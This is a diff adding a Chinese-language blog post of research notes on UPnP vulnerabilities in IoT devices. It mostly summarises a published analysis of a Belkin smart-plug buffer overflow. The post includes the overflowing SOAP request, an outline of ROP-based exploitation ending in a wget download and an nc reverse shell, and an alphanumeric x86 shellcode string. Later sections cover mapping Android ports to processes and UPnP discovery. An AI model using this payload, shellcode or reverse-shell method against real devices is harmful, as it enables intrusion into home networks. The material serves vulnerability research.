@@ -1,0 +1,96 @@
+---
+layout: post
+title:  "upnp协议漏洞研究"
+categories: IOT
+tags: IOT
+excerpt: upnp协议漏洞研究
+mathjax: true
+---
+
+* content
+{:toc}
+
+### Overview
+
+推荐一篇[路由器网关漏洞](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/insight-into-home-automation-reveals-vulnerability-in-simple-iot-product/)
+
+挖掘过程：
+1. 提取固件分析
+2. fuzz upnp (TCP 49152/49153), 定位漏洞点<EnergyPerUnitCostVersion> 大于32字符会溢出
+
+```
+POST /upnp/control/basicevent1 HTTP/1.1
+Host: 192.168.225.183:49154
+User-Agent: python-requests/2.9.1
+Accept: */*
+Connection: keep-alive
+SOAPAction: “urn:Belkin:service:basicevent:1#UpdateInsightHomeSettings”
+Content-Type: text/xml
+Accept-Encoding: gzip, deflate
+Content-Length: 3253
+
+<?xml version=”1.0″ ?><s:Envelope s:encodingStyle=”http://schemas.xmlsoap.org/soap/encoding/” xmlns:s=”http://schemas.xmlsoap.org/soap/envelope/”><s:Body><b1ack0wl_ns:UpdateInsightHomeSettingsxmlns:b1ack0wl_ns=”urn:Belkin:service:basicevent:1″><EnergyPerUnitCost>210</EnergyPerUnitCost><Currency>236</Currency><EnergyPerUnitCostVersion>KWWZWIVYBQZKDGSSAAPBCQVQQFAVYZEOEUFIDXXQPDYGESTOD
+GIJFERXZNMYAFJQLUZPSIJXFQSPADCRIVHDAJLLPQMPLAVECIQUWLXDLIGPLBKCROGPOCVUI
+KTSLIIXULOEBVFKWIERCFGHWHCBBDLWFBKBZXAVGRKTDALDNRPOFQJDXAEOC(…snip…)XHU
+OUZPCHUBFGLLWSJBFYFOMCGZZMJIQIUVCDETFBRBZVDVKNBVZFBRSVBSZPAYKZYNQZEQPDV
+DWSZNDUPUDCPAVWNFBFBTYMXTBNCWTBJPKORUBHBSCQBPOPOBZNVADMGWRI
+</EnergyPerUnitCostVersion></b1ack0wl_ns:UpdateInsightHomeSettings></s:Body></s:Envelope>
+```
+
+3. 修改/etc/passwd /etc/shadow 重刷固件 获取shell调试
+    + 任意地址写
+    + 覆盖$RA 控制返回地址
+4. 构造ROP 只能传输可显示字符串,过滤出所有的符合条件的地址，从中组合出合适的ROP
+    + 没有NX和ASLR 
+    + 攻击分两次，一次写入要执行的命令(不覆盖$ra) ,一次设置命令地址为参数后调用system
+5. wget 下载脚本执行，使用nc 反弹shell (可能大多数的设备没有这两个程序)
+
+IOT: 挖掘漏洞后 获取程序运行调试信息的问题
+UART接口有密码 /etc/passwd 破解不开 ,尝试重新打包文件系统(用同样的squash tools 3.0)，用dd 将文件系统插入固件中，再重新刷入 
+
+x86 下shellcode 
+`PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA`
+
+* UPNP 攻击的扩展: 通过javascript 攻击内网的服务
+
+[UPnP曝Filet-O-Firewall漏洞](https://www.freebuf.com/news/77057.html)
+[报告](https://securityaffairs.co/wordpress/12095/hacking/security-flaws-in-universal-plug-and-play-expose-million-devices.html)
+
+# 
+MiniUPnPd 有大概%69的设备使用，大多是1.0 版本。
+
+
+### 查找Android中端口的对应进程及文件
+例如查询upnp端口 49152 ，转成16进制c000
+
+```
+cat /proc/net/tcp6 | grep "c000"
+0: 00000000:C000 00000000:0000 0A 00000000:00000000 00:00000000 00000000 10055(uid)        0 17854 1 0000000000000000 100 0 0 10 0
+```
+取出其中uid 10055 对应着用户 u0_a55
+ps 查看
+```
+u0_a55    4799  3798  1568824 57924 SyS_epoll_ 00000000 S com.hpplay.happyplay.aw
+u0_a55    4887  3798  1522792 35844 SyS_epoll_ 00000000 S com.hpplay.happyplay.aw:remote
+```
+
+查看包名安装位置
+`pm list packages -f`
+```
+shell@q201:/ $ pm list packages -f | grep happy
+package:/data/app/happycast_hmdkey.apk=com.hpplay.happyplay.aw
+```
+
+
+```
+$ miranda
+upnp> msearch
+
+Entering discovery mode for 'upnp:rootdevice', Ctl+C to stop...
+
+****************************************************************
+SSDP reply message from 192.168.1.138:49152
+XML file is located at http://192.168.1.138:49152/description.xml
+Device is running Linux/3.14.29, UPnP/1.0, Portable SDK for UPnP devices/1.6.13
+****************************************************************
+```
